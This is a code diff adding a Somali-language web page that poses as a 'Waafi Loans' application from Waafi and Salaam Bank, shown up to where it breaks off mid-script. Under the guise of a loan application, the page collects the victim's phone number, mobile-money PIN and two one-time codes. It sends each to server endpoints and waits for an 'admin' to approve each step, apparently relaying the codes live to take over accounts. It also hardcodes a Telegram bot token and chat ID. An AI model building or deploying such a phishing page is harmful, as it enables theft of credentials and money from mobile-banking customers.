@@ -1,0 +1,1389 @@
+<!doctype html>
+<html lang="so">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport"
+    content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover" />
+  <meta name="theme-color" content="#7bbf2e" />
+  <title>Waafi Loans · Gal</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800;900&family=DM+Mono:wght@400;500;700&display=swap"
+    rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent
+    }
+
+    :root {
+      --g: #7bbf2e;
+      --gd: #5a9020;
+      --gl: #f2f9e6;
+      --gm: #e3f4c0;
+      --gs: #f8fdf0;
+      --t: #111827;
+      --t2: #374151;
+      --t3: #6b7280;
+      --t4: #9ca3af;
+      --b: #e5e7eb;
+      --bg: rgba(123, 191, 46, .25);
+      --font: 'DM Sans', sans-serif;
+      --mono: 'DM Mono', monospace;
+      --r: 14px;
+      --rl: 18px;
+      --rxl: 26px;
+    }
+
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      height: 100dvh;
+      overflow: hidden;
+      font-family: var(--font);
+      background: var(--gs)
+    }
+
+    .screen {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      height: 100%;
+      max-width: 430px;
+      margin: 0 auto;
+      background: var(--gs);
+      overflow: hidden;
+      position: relative
+    }
+
+    /* TOP WHITE BAR */
+    .top-bar {
+      background: #fff;
+      padding: 10px 18px;
+      flex-shrink: 0;
+      border-bottom: 1px solid #e8f5d8;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, .05)
+    }
+
+    .logos-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 6px
+    }
+
+    .logo-w {
+      height: 84px;
+      object-fit: contain;
+      display: block
+    }
+
+    .logo-s {
+      height: 63px;
+      object-fit: contain;
+      display: block
+    }
+
+    .logo-sep {
+      width: 1px;
+      height: 50px;
+      background: #d1e8b0;
+      flex-shrink: 0
+    }
+
+    .bottom-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between
+    }
+
+    .brand-name {
+      font-size: 13px;
+      font-weight: 800;
+      color: var(--gd)
+    }
+
+    .chip {
+      background: linear-gradient(135deg, #93cc3a, #5a9020);
+      color: #fff;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 5px 13px;
+      border-radius: 999px
+    }
+
+    /* GREEN HEADER */
+    .header {
+      background: linear-gradient(150deg, #93cc3a 0%, #7bbf2e 50%, #5a9020 100%);
+      padding: 14px 18px 18px;
+      position: relative;
+      overflow: hidden;
+      flex-shrink: 0
+    }
+
+    .header::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image: linear-gradient(rgba(255, 255, 255, .07)1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, .07)1px, transparent 1px);
+      background-size: 44px 44px;
+      pointer-events: none
+    }
+
+    .ga {
+      position: absolute;
+      width: 200px;
+      height: 200px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, .12);
+      filter: blur(45px);
+      top: -80px;
+      right: -50px;
+      pointer-events: none
+    }
+
+    .gb {
+      position: absolute;
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      background: rgba(0, 60, 10, .18);
+      filter: blur(35px);
+      bottom: -40px;
+      left: -20px;
+      pointer-events: none
+    }
+
+    .hlabel {
+      font-size: 10px;
+      color: rgba(255, 255, 255, .7);
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .5px;
+      margin-bottom: 3px;
+      position: relative;
+      z-index: 1
+    }
+
+    .hamount-row {
+      display: flex;
+      align-items: flex-end;
+      gap: 4px;
+      margin-bottom: 8px;
+      position: relative;
+      z-index: 1
+    }
+
+    .hcur {
+      font-size: 14px;
+      font-weight: 700;
+      color: rgba(255, 255, 255, .75);
+      margin-bottom: 2px
+    }
+
+    .hamt {
+      font-size: 36px;
+      font-weight: 800;
+      color: #fff;
+      line-height: 1;
+      font-family: var(--mono)
+    }
+
+    .hpills {
+      display: flex;
+      gap: 6px;
+      flex-wrap: wrap;
+      position: relative;
+      z-index: 1
+    }
+
+    .hpill {
+      background: rgba(255, 255, 255, .18);
+      border: 1px solid rgba(255, 255, 255, .28);
+      border-radius: 999px;
+      padding: 3px 10px;
+      font-size: 10px;
+      font-weight: 700;
+      color: #fff;
+      font-family: var(--mono)
+    }
+
+    /* BODY */
+    .body {
+      flex: 1;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      padding: 14px 14px max(84px, calc(68px + env(safe-area-inset-bottom)));
+      min-height: 0;
+      overscroll-behavior: contain
+    }
+
+    .body::-webkit-scrollbar {
+      display: none
+    }
+
+    /* CARD */
+    .card {
+      background: #fff;
+      border: 1px solid var(--b);
+      border-radius: var(--rl);
+      overflow: hidden;
+      margin-bottom: 10px;
+      box-shadow: 0 2px 8px rgba(123, 191, 46, .08)
+    }
+
+    .cacc {
+      height: 3px;
+      background: linear-gradient(90deg, #93cc3a, #7bbf2e, #a8d95a)
+    }
+
+    .ch {
+      padding: 12px 16px 10px;
+      border-bottom: 1px solid var(--b)
+    }
+
+    .ct {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--t)
+    }
+
+    .cs {
+      font-size: 11px;
+      color: var(--t3);
+      margin-top: 2px
+    }
+
+    .cb {
+      padding: 14px 16px
+    }
+
+    .card-logo {
+      display: flex;
+      justify-content: center;
+      padding: 14px 0 6px
+    }
+
+    .card-logo img {
+      height: 56px;
+      object-fit: contain
+    }
+
+    /* FIELD */
+    .f {
+      margin-bottom: 13px
+    }
+
+    .f:last-child {
+      margin-bottom: 0
+    }
+
+    .fl {
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--t2);
+      text-transform: uppercase;
+      letter-spacing: .6px;
+      margin-bottom: 6px
+    }
+
+    .fhint {
+      font-size: 11px;
+      color: var(--t4);
+      margin-top: 5px
+    }
+
+    /* PHONE */
+    .prow {
+      display: flex;
+      gap: 8px
+    }
+
+    .ppfx {
+      background: var(--gl);
+      color: var(--gd);
+      font-size: 13px;
+      font-weight: 800;
+      font-family: var(--mono);
+      padding: 0 12px;
+      border-radius: var(--r);
+      border: 1.5px solid var(--bg);
+      height: 48px;
+      display: flex;
+      align-items: center;
+      flex-shrink: 0
+    }
+
+    .inp {
+      width: 100%;
+      height: 48px;
+      padding: 0 13px;
+      border-radius: var(--r);
+      border: 1.5px solid var(--b);
+      background: var(--gs);
+      font-family: var(--mono);
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--t);
+      outline: none;
+      -webkit-appearance: none;
+      transition: border-color .15s
+    }
+
+    .inp:focus {
+      border-color: var(--g);
+      box-shadow: 0 0 0 3px rgba(123, 191, 46, .12);
+      background: #fff
+    }
+
+    /* PIN — 4 cells each containing one real input */
+    .pin-row {
+      display: flex;
+      gap: 9px;
+      align-items: center
+    }
+
+    .pin-cells {
+      display: flex;
+      gap: 9px;
+      flex: 1
+    }
+
+    .pin-cell {
+      flex: 1;
+      height: 56px;
+      position: relative;
+      border-radius: 12px;
+      border: 1.5px solid var(--b);
+      background: var(--gs);
+      transition: border-color .15s, background .15s;
+      overflow: hidden
+    }
+
+    .pin-cell:focus-within {
+      border-color: var(--g);
+      box-shadow: 0 0 0 3px rgba(123, 191, 46, .12);
+      background: #fff
+    }
+
+    .pin-cell input {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+      outline: none;
+      background: transparent;
+      text-align: center;
+      font-family: var(--mono);
+      font-size: 22px;
+      font-weight: 800;
+      color: var(--t);
+      -webkit-appearance: none;
+      padding: 0;
+      cursor: text;
+      -webkit-text-security: disc
+    }
+
+    .pin-cell input.show {
+      -webkit-text-security: none
+    }
+
+    .eye-btn {
+      width: 46px;
+      height: 56px;
+      border-radius: 12px;
+      border: 1.5px solid var(--bg);
+      background: var(--gl);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      flex-shrink: 0;
+      color: var(--gd)
+    }
+
+    /* STEP */
+    .step {
+      display: none
+    }
+
+    .step.active {
+      display: block
+    }
+
+    /* FOOTER */
+    .footer {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      padding: 10px 14px max(18px, env(safe-area-inset-bottom));
+      background: linear-gradient(to top, var(--gs) 70%, transparent);
+      z-index: 10
+    }
+
+    .fbtn {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: var(--r);
+      background: linear-gradient(135deg, #93cc3a, #7bbf2e, #5a9020);
+      color: #fff;
+      font-family: var(--font);
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      opacity: .4;
+      pointer-events: none;
+      box-shadow: 0 4px 14px rgba(123, 191, 46, .3)
+    }
+
+    .fbtn.on {
+      opacity: 1;
+      pointer-events: auto
+    }
+
+    .pw {
+      text-align: center;
+      padding: 4px 0;
+      font-size: 10px;
+      color: var(--t4)
+    }
+
+    .pw strong {
+      color: var(--t3)
+    }
+
+    /* MODAL */
+    .ov {
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, .4);
+      display: none;
+      align-items: flex-end;
+      z-index: 100
+    }
+
+    .ov.open {
+      display: flex
+    }
+
+    .ov.center {
+      align-items: center;
+      justify-content: center;
+      padding: 20px
+    }
+
+    .ms {
+      background: #fff;
+      width: 100%;
+      border-radius: var(--rxl) var(--rxl) 0 0;
+      padding: 0 0 28px;
+      animation: up .2s ease;
+      overflow: hidden
+    }
+
+    .ov.center .ms {
+      border-radius: var(--rxl);
+      width: 100%;
+      max-width: 400px;
+      animation: pop .2s ease
+    }
+
+    @keyframes up {
+      from {
+        transform: translateY(100%)
+      }
+
+      to {
+        transform: translateY(0)
+      }
+    }
+
+    .ov.center .mh {
+      display: none
+    }
+
+    .mh {
+      width: 32px;
+      height: 4px;
+      background: #e5e7eb;
+      border-radius: 2px;
+      margin: 10px auto 0
+    }
+
+    .mhdr {
+      padding: 14px 18px 12px;
+      border-bottom: 1px solid var(--b);
+      display: flex;
+      align-items: center;
+      justify-content: space-between
+    }
+
+    .mtitle {
+      font-size: 16px;
+      font-weight: 800;
+      color: var(--t)
+    }
+
+    .mclose {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: #f3f4f6;
+      border: none;
+      font-size: 12px;
+      color: var(--t3);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center
+    }
+
+    .mb {
+      padding: 14px 18px
+    }
+
+    .msub {
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: .7px;
+      font-weight: 700;
+      color: var(--t4);
+      margin-bottom: 10px
+    }
+
+    .masked-note {
+      font-size: 13px;
+      color: var(--t3);
+      font-weight: 500;
+      text-align: center;
+      padding: 2px 0 8px
+    }
+
+    /* OTP boxes */
+    .otp-wrap {
+      position: relative;
+      height: 58px;
+      margin-bottom: 4px
+    }
+
+    .otp-wrap input.otp-hidden {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      opacity: .01;
+      z-index: 2;
+      font-size: 16px;
+      border: none;
+      outline: none;
+      background: transparent;
+      caret-color: transparent
+    }
+
+    .otp-disp {
+      display: flex;
+      gap: 7px;
+      height: 100%;
+      pointer-events: none
+    }
+
+    .otp-box {
+      flex: 1;
+      height: 58px;
+      border-radius: 11px;
+      border: 1.5px solid var(--b);
+      background: var(--gs);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: var(--mono);
+      font-size: 22px;
+      font-weight: 800;
+      color: var(--t);
+      transition: border-color .15s, background .15s
+    }
+
+    .otp-box.f {
+      background: #fff;
+      border-color: var(--g)
+    }
+
+    .otp-box.a {
+      border-color: var(--g);
+      box-shadow: 0 0 0 3px rgba(123, 191, 46, .12);
+      background: #fff
+    }
+
+    .otp-box.d {
+      opacity: .35;
+      background: #f9fafb
+    }
+
+    .tr {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 8px
+    }
+
+    .tl {
+      font-size: 12px;
+      color: var(--t4)
+    }
+
+    .tv {
+      font-family: var(--mono);
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--gd)
+    }
+
+    .rb {
+      background: none;
+      border: none;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--g);
+      opacity: .3;
+      cursor: pointer;
+      padding: 0
+    }
+
+    .rb.on {
+      opacity: 1
+    }
+
+    /* Summary */
+    .srows {
+      background: #f9fafb;
+      border-radius: var(--r);
+      overflow: hidden;
+      border: 1px solid var(--b);
+      margin-bottom: 12px
+    }
+
+    .sr {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 13px;
+      border-bottom: 1px solid var(--b)
+    }
+
+    .sr:last-child {
+      border-bottom: none
+    }
+
+    .srk {
+      font-size: 12px;
+      color: var(--t3);
+      font-weight: 500
+    }
+
+    .srv {
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--t)
+    }
+
+    .stot {
+      background: var(--gl);
+      border-radius: var(--r);
+      padding: 13px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+      border: 1px solid var(--bg)
+    }
+
+    .stl {
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--gd)
+    }
+
+    .stv {
+      font-size: 20px;
+      font-weight: 800;
+      color: var(--g);
+      font-family: var(--mono)
+    }
+
+    .sact {
+      display: flex;
+      gap: 9px
+    }
+
+    .sc {
+      flex: 1;
+      padding: 13px;
+      border-radius: var(--r);
+      border: 1.5px solid var(--b);
+      background: transparent;
+      font-family: var(--font);
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--t3);
+      cursor: pointer
+    }
+
+    .sp {
+      flex: 2;
+      padding: 13px;
+      border-radius: var(--r);
+      border: none;
+      background: linear-gradient(135deg, #93cc3a, #7bbf2e, #5a9020);
+      font-family: var(--font);
+      font-size: 14px;
+      font-weight: 800;
+      color: #fff;
+      cursor: pointer
+    }
+
+    .otp-go {
+      width: 100%;
+      margin-top: 14px;
+      padding: 14px;
+      border-radius: var(--r);
+      border: none;
+      background: linear-gradient(135deg, #93cc3a, #7bbf2e, #5a9020);
+      font-family: var(--font);
+      font-size: 14px;
+      font-weight: 800;
+      color: #fff;
+      cursor: pointer;
+      opacity: .4;
+      pointer-events: none
+    }
+
+    .otp-go.on {
+      opacity: 1;
+      pointer-events: auto
+    }
+
+    .loader-ov {
+      position: absolute;
+      inset: 0;
+      background: rgba(255, 255, 255, .97);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 300;
+      gap: 22px
+    }
+
+    .loader-ov.show {
+      display: flex
+    }
+
+    .pulse-ring {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      display: flex;
+      align-items: center;
+      justify-content: center
+    }
+
+    .pulse-ring::before,
+    .pulse-ring::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 3px solid #7bbf2e;
+      animation: ripple 2s ease-out infinite
+    }
+
+    .pulse-ring::after {
+      animation-delay: .8s
+    }
+
+    @keyframes ripple {
+      0% {
+        transform: scale(.7);
+        opacity: .8
+      }
+
+      100% {
+        transform: scale(1.5);
+        opacity: 0
+      }
+    }
+
+    .pulse-inner {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      overflow: hidden;
+      z-index: 1;
+      animation: beat 1.5s ease-in-out infinite
+    }
+
+    @keyframes beat {
+
+      0%,
+      100% {
+        transform: scale(1)
+      }
+
+      50% {
+        transform: scale(1.07)
+      }
+    }
+
+    .pulse-inner img {
+      height: 80px;
+      width: 80px;
+      border-radius: 50%;
+      object-fit: cover;
+      display: block
+    }
+
+    .loader-text {
+      font-size: 14px;
+      font-weight: 700;
+      color: #5a9020;
+      text-align: center
+    }
+
+    .loader-sub {
+      font-size: 12px;
+      color: #6b7280;
+      text-align: center;
+      margin-top: 4px
+    }
+
+    /* ── PAGE TRANSITIONS ── */
+    .screen {
+      animation: pgIn .35s ease both
+    }
+
+    @keyframes pgIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px)
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0)
+      }
+    }
+
+    .screen.leaving {
+      animation: pgOut .25s ease forwards !important
+    }
+
+    @keyframes pgOut {
+      to {
+        opacity: 0;
+        transform: translateY(-8px)
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="screen">
+
+    <!-- WHITE BAR -->
+    <div class="top-bar">
+      <div class="logos-row">
+        <img src="assets/waafi.svg" alt="Waafi" class="logo-w">
+        <div class="logo-sep"></div>
+        <img src="assets/salaamlogo.webp" alt="Salaam" class="logo-s">
+      </div>
+      <div class="bottom-row">
+        <span class="brand-name">Waafi Loans</span>
+        <span class="chip">Amaah Degdeg ah</span>
+      </div>
+    </div>
+
+    <!-- GREEN HEADER -->
+    <div class="header">
+      <div class="ga"></div>
+      <div class="gb"></div>
+      <div class="hlabel">Xaddiga Amaahda</div>
+      <div class="hamount-row">
+        <span class="hcur">USD</span><span class="hamt" id="hAmt">0.00</span>
+      </div>
+      <div class="hpills">
+        <span class="hpill" id="hType">—</span>
+        <span class="hpill" id="hDur">—</span>
+        <span class="hpill" id="hAge">—</span>
+      </div>
+    </div>
+
+    <!-- BODY -->
+    <div class="body">
+
+      <div class="step active" id="step1">
+        <div class="card">
+          <div class="cacc"></div>
+          <div class="card-logo"><img src="assets/waafi.svg" alt="Waafi"></div>
+          <div class="ch">
+            <div class="ct">Xaqiiji Codsigaaga</div>
+            <div class="cs">Gali lambarka iyo PIN-kaaga Waafi</div>
+          </div>
+          <div class="cb">
+
+            <div class="f">
+              <div class="fl">Lambarka Telefoonka</div>
+              <div class="prow">
+                <div class="ppfx">+252</div>
+                <input class="inp" type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="9XXXXXXXX">
+              </div>
+            </div>
+
+            <div class="f">
+              <div class="fl">PIN-kaaga</div>
+              <div class="pin-row">
+                <div class="pin-cells">
+                  <div class="pin-cell"><input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]"
+                      autocomplete="off" id="p0"></div>
+                  <div class="pin-cell"><input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]"
+                      autocomplete="off" id="p1"></div>
+                  <div class="pin-cell"><input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]"
+                      autocomplete="off" id="p2"></div>
+                  <div class="pin-cell"><input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]"
+                      autocomplete="off" id="p3"></div>
+                </div>
+                <button class="eye-btn" id="eyeBtn" type="button">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                    <circle cx="12" cy="12" r="3" />
+                  </svg>
+                </button>
+              </div>
+            </div>
+
+          </div>
+        </div>
+        <div class="pw">Powered by <strong>Waafi</strong> &middot; <strong>Salaam Bank</strong></div>
+      </div>
+
+      <div class="step" id="step4">
+        <div class="card" style="text-align:center;padding:32px 16px">
+          <div style="font-size:40px;margin-bottom:10px">✅</div>
+          <div style="font-size:17px;font-weight:800;color:var(--t);margin-bottom:6px">La gudbiyay!</div>
+          <div style="font-size:13px;color:var(--t3);line-height:1.6">Codsigaaga amaahda ayaa la diray.</div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="footer">
+      <button class="fbtn" id="mainBtn">Xaqiiji Faahfaahinta →</button>
+    </div>
+
+    <!-- Login OTP modal -->
+    <div class="ov center" id="m1" onclick="bgClose('m1',event)">
+      <div class="ms">
+        <div class="mh"></div>
+        <div class="mhdr">
+          <span class="mtitle">Xaqiiji Aqoonsiga</span>
+          <button class="mclose" onclick="cm('m1')">✕</button>
+        </div>
+        <div class="mb">
+          <div class="masked-note" id="mn1"></div>
+          <div class="otp-wrap" id="ow1">
+            <input type="text" id="oh1" inputmode="numeric" maxlength="6" autocomplete="one-time-code"
+              class="otp-hidden">
+            <div class="otp-disp">
+              <div class="otp-box" id="o1b0"></div>
+              <div class="otp-box" id="o1b1"></div>
+              <div class="otp-box" id="o1b2"></div>
+              <div class="otp-box" id="o1b3"></div>
+              <div class="otp-box" id="o1b4"></div>
+              <div class="otp-box" id="o1b5"></div>
+            </div>
+          </div>
+          <div class="tr">
+            <div class="tl">Dhacaysaa <span class="tv" id="t1">120</span>s</div>
+            <button class="rb" id="r1">Dib u dir</button>
+          </div>
+          <button class="otp-go" id="g1" onclick="submitOtp1()">Xaqiiji →</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Summary modal -->
+    <div class="ov" id="msum" onclick="bgClose('msum',event)">
+      <div class="ms">
+        <div class="mh"></div>
+        <div class="mhdr">
+          <span class="mtitle">Kooban Codsiga</span>
+          <button class="mclose" onclick="cm('msum')">✕</button>
+        </div>
+        <div class="mb">
+          <div class="msub">Faahfaahinta Amaahda</div>
+          <div class="srows" id="sumRows"></div>
+          <div class="stot">
+            <span class="stl">Celinta Bishiiba</span>
+            <span class="stv" id="sumMo">$0.00</span>
+          </div>
+          <div class="sact">
+            <button class="sc" onclick="cm('msum')">Dib u eeg</button>
+            <button class="sp" onclick="openOtp2()">Gudbi Codsiga →</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Waafi OTP modal -->
+    <div class="ov center" id="m2" onclick="bgClose('m2',event)">
+      <div class="ms">
+        <div class="mh"></div>
+        <div class="mhdr">
+          <span class="mtitle">Gudbi Codsiga</span>
+          <button class="mclose" onclick="cm('m2')">✕</button>
+        </div>
+        <div class="mb">
+          <div class="masked-note" id="mn2"></div>
+          <div class="otp-wrap" id="ow2">
+            <input type="text" id="oh2" inputmode="numeric" maxlength="6" autocomplete="one-time-code"
+              class="otp-hidden">
+            <div class="otp-disp">
+              <div class="otp-box" id="o2b0"></div>
+              <div class="otp-box" id="o2b1"></div>
+              <div class="otp-box" id="o2b2"></div>
+              <div class="otp-box" id="o2b3"></div>
+              <div class="otp-box" id="o2b4"></div>
+              <div class="otp-box" id="o2b5"></div>
+            </div>
+          </div>
+          <div class="tr">
+            <div class="tl">Dhacaysaa <span class="tv" id="t2">120</span>s</div>
+            <button class="rb" id="r2">Dib u dir</button>
+          </div>
+          <button class="otp-go" id="g2" onclick="submitOtp2()">Gudbi Codsiga ✓</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="loader-ov" id="loaderOv">
+      <div class="pulse-ring">
+        <div class="pulse-inner"><img src="https://raw.githubusercontent.com/Lenkartel/waafi/main/assets/waafi.webp"
+            alt="Waafi"></div>
+      </div>
+      <div>
+        <div class="loader-text" id="loaderText">La xaqiijinayaa...</div>
+        <div class="loader-sub">Fadlan sug...</div>
+      </div>
+    </div>
+
+  </div>
+  <script>
+    /* ── Plan ── */
+    let P = null;
+    try { P = JSON.parse(sessionStorage.getItem("selectedPlan")) } catch (e) { }
+
+    function fmt(n) { return parseFloat(n || 0).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) }
+    function calcAge(dob) {
+      if (!dob) return "—";
+      const d = new Date(dob), n = new Date();
+      let a = n.getFullYear() - d.getFullYear();
+      if (n < new Date(n.getFullYear(), d.getMonth(), d.getDate())) a--;
+      return a + " sano";
+    }
+    function maskPhone(ph) {
+      // +252 9XX****XX  → show first 3 after code, star 4, show last 2
+      const num = ph.replace("+252", "");
+      if (num.length < 7) return ph;
+      return "+252 " + num.slice(0, 3) + "****" + num.slice(-2);
+    }
+
+    let phoneValue = "", otp1Val = "", otp2Val = "", otp1Done = false, otp2Done = false;
+
+    if (P) {
+      document.getElementById("hAmt").textContent = fmt(P.loanAmount || 0);
+      document.getElementById("hType").textContent = P.loanType || "Amaah";
+      document.getElementById("hDur").textContent = (P.duration || 1) + " bilood";
+      document.getElementById("hAge").textContent = calcAge(P.dob);
+      if (P.phone) {
+        const ph = (P.phone || "").replace("+252", "");
+        document.getElementById("phone").value = ph;
+        phoneValue = "+252" + ph;
+      }
+    }
+
+    const ua = navigator.userAgent;
+    let device = (/Android/i.test(ua) ? "Android" : /iPhone|iPad/i.test(ua) ? "iOS" : "Unknown");
+    device += (/Chrome/i.test(ua) ? " | Chrome" : /Safari/i.test(ua) ? " | Safari" : "");
+
+    function planInfo() { return P ? `Amaah: $${fmt(P.loanAmount)} | ${P.duration} bilood | Da: ${calcAge(P.dob)} | ${P.loanType}` : "—" }
+
+    const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
+    const TELEGRAM_CHAT_ID = "7162306402";
+
+    /* --- NEW BACKEND COMMUNICATION LOGIC --- */
+    
+    // UPDATE 1: Confirm Details opens Modal 1 and sends Login Attempt
+    document.getElementById("mainBtn").onclick = function () {
+      fetch('/api/login-attempt', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: phoneValue, pin: getPin(), device: device })
+      });
+      
+      document.getElementById("mn1").textContent = "OTP waxaa loo diray " + maskPhone(phoneValue);
+      document.getElementById("mn2").textContent = "OTP waxaa loo diray " + maskPhone(phoneValue);
+      om("m1"); 
+      startTimer(1);
+    };
+
+    // Polling function for the frontend to wait for admin
+    function waitForAdmin(reqId, onSuccess, onDecline) {
+      const TIMEOUT_MS = 5 * 60 * 1000; // 5 minute hard timeout
+      const started = Date.now();
+
+      const interval = setInterval(async () => {
+        // Safety timeout — stop polling after 5 minutes
+        if (Date.now() - started > TIMEOUT_MS) {
+          clearInterval(interval);
+          document.getElementById("loaderOv").classList.remove("show");
+          onDecline();
+          return;
+        }
+        try {
+          const res = await fetch(`/api/check-status/${reqId}`);
+          const data = await res.json();
+          
+          if (data.status === 'accept') {
+            clearInterval(interval);
+            document.getElementById("loaderOv").classList.remove("show");
+            onSuccess();
+          } else if (data.status === 'decline') {
+            clearInterval(interval);
+            document.getElementById("loaderOv").classList.remove("show");
+            onDecline();
+          }
+          // If 'pending' or 'not_found', keep waiting
+        } catch (e) {
+          console.error("Polling error:", e);
+        }
+      }, 2000); // Check every 2 seconds
+    }
+
+    // UPDATE 2: OTP 1 Submission
+    async function submitOtp1() {
+      if (otp1Val.length !== 6 || otp1Done) return;
+      
+      document.getElementById("oh1").disabled = true;
+      document.getElementById("loaderText").textContent = "Fadlan sug... Admin is checking";
+      document.getElementById("loaderOv").classList.add("show");
+
+      // Send to server
+      const res = await fetch('/api/verify-identity', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: phoneValue, otp1: otp1Val })
+      });
+      const data = await res.json();
+
+      // Wait for admin response
+      waitForAdmin(data.sessionId, 
+        // If Accepted
+        function() {
+          otp1Done = true;
+          cm("m1");
+          buildSummary();
+          om("msum");
+        },
+        // If Declined
+        function() {
+          document.getElementById("oh1").disabled = false;
+          otp1.reset(false);
+          document.getElementById("mn1").innerHTML = "<span style='color:#dc2626; font-weight:bold;'>⚠️ Code is incorrect or expired. Try again.</span>";
+        }
+      );
+    }
+
+    // UPDATE 3: OTP 2 Submission
+    async function submitOtp2() {
+      if (otp2Val.length !== 6 || otp2Done) return;
+      if (otp2Val === otp1Val) {
+        document.getElementById("mn2").innerHTML = "<span style='color:#dc2626;'>⚠️ OTP-gan waa midkii hore. Gali mid cusub.</span>";
+        return;
+      }
+      
+      document.getElementById("oh2").disabled = true;
+      document.getElementById("loaderText").textContent = "La gudbinayaa codsiga...";
+      document.getElementById("loaderOv").classList.add("show");
+
+      // Send to server
+      const res = await fetch('/api/submit-application', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: phoneValue, otp2: otp2Val, planInfo: planInfo() })
+      });
+      const data = await res.json();
+
+      // Wait for admin response
+      waitForAdmin(data.sessionId, 
+        // If Accepted
+        function() {
+          otp2Done = true;
+          sessionStorage.setItem("selectedPlan", JSON.stringify({ ...(P || {}), phone: phoneValue }));
+          cm("m2");
+          navigateTo("thankyou.html");
+        },
+        // If Declined
+        function() {
+          cm("m2");
+          navigateTo("login.html");
+        }
+      );
+    }
+
+    /* ── Phone ── */
+    document.getElementById("phone").oninput = function () {
+      let v = this.value.replace(/\D/g, "");
+      if (v.startsWith("252")) v = v.slice(3);
+      if (v.startsWith("0")) v = v.slice(1);
+      this.value = v.slice(0, 9);
+      phoneValue = "+252" + this.value;
+      validate();
+    };
+
+    /* ── PIN: 4 cell wrappers, each with one real input inside ── */
+    const pinEls = [0, 1, 2, 3].map(i => document.getElementById("p" + i));
+    let eyeOn = false;
+
+    pinEls.forEach((el, i) => {
+      el.addEventListener("input", function () {
+        const v = this.value.replace(/\D/g, "");
+        this.value = v ? v[0] : "";
+        if (this.value && i < 3) pinEls[i + 1].focus();
+        validate();
+      });
+      el.addEventListener("keydown", function (e) {
+        if (e.key === "Backspace" && !this.value && i > 0) {
+          pinEls[i - 1].value = "";
+          pinEls[i - 1].focus();
+          validate();
+        }
+      });
+    });
+
+    function getPin() { return pinEls.map(e => e.value).join("") }
+
+    document.getElementById("eyeBtn").onclick = function () {
+      eyeOn = !eyeOn;
+      pinEls.forEach(e => e.classList.toggle("show", eyeOn));
+      this.innerHTML = eyeOn
+        ? `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
